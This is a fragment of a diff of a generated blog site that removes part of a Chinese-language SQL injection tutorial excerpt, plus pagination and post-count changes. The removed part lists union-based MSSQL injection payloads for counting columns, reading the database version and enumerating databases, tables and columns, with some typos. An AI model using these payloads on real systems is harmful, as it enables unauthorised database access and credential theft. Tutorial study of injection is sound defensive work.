-<p>上方3中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id</p>
-<p>select * from admin inner join admin1 on admin.id = admin1.id返回两个表内容<br>MSSQL</p>
-<pre><code>判断字段个数order by 13
-判断字段回显位and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13
-数据库版本and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13
-当前数据库名and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13
-所有数据库名（通过更改dbid，7以上的是用户数据库）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --
-表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
-字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
-根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
-</code></pre><p>ASSESS<br>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/12/01/sql注入问题详解/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -810,7 +1064,7 @@ http://example.asp?id=49 and 1=2
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-count">17</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -827,7 +1081,7 @@ http://example.asp?id=49 and 1=2
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-count">13</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
